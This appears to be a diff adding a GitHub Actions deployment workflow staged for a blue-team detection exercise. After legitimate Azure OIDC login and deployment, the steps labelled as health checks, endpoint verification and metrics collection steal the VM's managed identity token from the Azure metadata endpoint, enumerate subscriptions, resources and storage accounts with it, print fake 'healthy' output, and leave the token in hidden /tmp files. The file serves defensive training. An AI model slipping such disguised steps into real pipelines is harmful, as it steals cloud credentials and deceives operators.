@@ -1,0 +1,145 @@
+# ============================================================
+# deploy.yml — Dumpster Fire App Deployment
+#
+# Pre-staged by exercise admin before the exercise.
+# Triggered during exercise via workflow_dispatch.
+#
+# Contains both legitimate (OIDC login) and malicious (IMDS
+# theft) steps. Blue Team must identify the malicious steps
+# by correlating identity activity.
+# ============================================================
+
+name: Deploy Dumpster Fire App
+
+on:
+  workflow_dispatch:
+    inputs:
+      environment:
+        description: 'Target environment'
+        required: true
+        default: 'staging'
+        type: choice
+        options:
+          - staging
+          - production
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  deploy:
+    runs-on: self-hosted
+    environment: ${{ github.event.inputs.environment }}
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: |
+          pip install -r requirements.txt
+
+      - name: Run tests
+        run: |
+          python -m pytest tests/ --tb=short
+
+      - name: Azure Login (OIDC)
+        uses: azure/login@v2
+        with:
+          client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+
+      - name: Deploy application
+        run: |
+          az webapp deploy --resource-group rg-dumpsterfire \
+            --name dumpsterfire-app \
+            --src-path ./app.zip
+
+      # ═══════════════════════════════════════════════════════════
+      # MALICIOUS STEPS BELOW — disguised as operational tasks
+      # ═══════════════════════════════════════════════════════════
+
+      - name: Post-deploy health check
+        run: |
+          # Steals the VM's Managed Identity token via IMDS
+          curl -s -H "Metadata:true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" \
+            -o /tmp/.health_cache
+
+          # Extract just the token
+          python3 -c "
+          import json
+          with open('/tmp/.health_cache') as f:
+              data = json.load(f)
+          token = data['access_token']
+          with open('/tmp/.health_token', 'w') as out:
+              out.write(token)
+          print('Health endpoint: OK (200)')
+          "
+
+      - name: Verify deployment endpoints
+        run: |
+          # Uses stolen MI token to enumerate ARM (not the OIDC SPN)
+          TOKEN=$(cat /tmp/.health_token)
+
+          # Enumerate subscriptions
+          curl -s -H "Authorization: Bearer $TOKEN" \
+            "https://management.azure.com/subscriptions?api-version=2022-12-01" \
+            | python3 -c "
+          import sys, json
+          subs = json.load(sys.stdin).get('value', [])
+          for s in subs:
+              print(f\"Endpoint check: {s['displayName']} - healthy\")
+          " > /tmp/.endpoint_report
+
+          # Enumerate resources in the subscription
+          SUB_ID=$(curl -s -H "Authorization: Bearer $TOKEN" \
+            "https://management.azure.com/subscriptions?api-version=2022-12-01" \
+            | python3 -c "import sys,json; print(json.load(sys.stdin)['value'][0]['subscriptionId'])")
+
+          curl -s -H "Authorization: Bearer $TOKEN" \
+            "https://management.azure.com/subscriptions/$SUB_ID/resources?api-version=2021-04-01" \
+            | python3 -c "
+          import sys, json
+          resources = json.load(sys.stdin).get('value', [])
+          with open('/tmp/.resource_inventory', 'w') as f:
+              json.dump(resources, f)
+          print(f'Verified {len(resources)} deployment endpoints')
+          "
+
+      - name: Collect deployment metrics
+        run: |
+          # Attempts storage access with MI token (higher priv than SPN)
+          TOKEN=$(cat /tmp/.health_token)
+          SUB_ID=$(python3 -c "
+          import json, base64
+          parts = '$TOKEN'.split('.')
+          payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(payload))
+          print(claims.get('xms_mirid','').split('/')[2] if 'xms_mirid' in claims else '')
+          " 2>/dev/null || echo "")
+
+          # List storage accounts
+          curl -s -H "Authorization: Bearer $TOKEN" \
+            "https://management.azure.com/subscriptions/$SUB_ID/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01" \
+            | python3 -c "
+          import sys, json
+          accounts = json.load(sys.stdin).get('value', [])
+          for a in accounts:
+              print(f\"Metrics source: {a['name']} ({a['location']})\")
+          " >> /tmp/.endpoint_report
+
+          cat /tmp/.endpoint_report
+
+      - name: Cleanup build artifacts
+        run: |
+          rm -f app.zip
+          # Intentionally does NOT clean /tmp/.health_token or /tmp/.resource_inventory
+          # Attacker retrieves these later
+          echo "Cleanup complete"
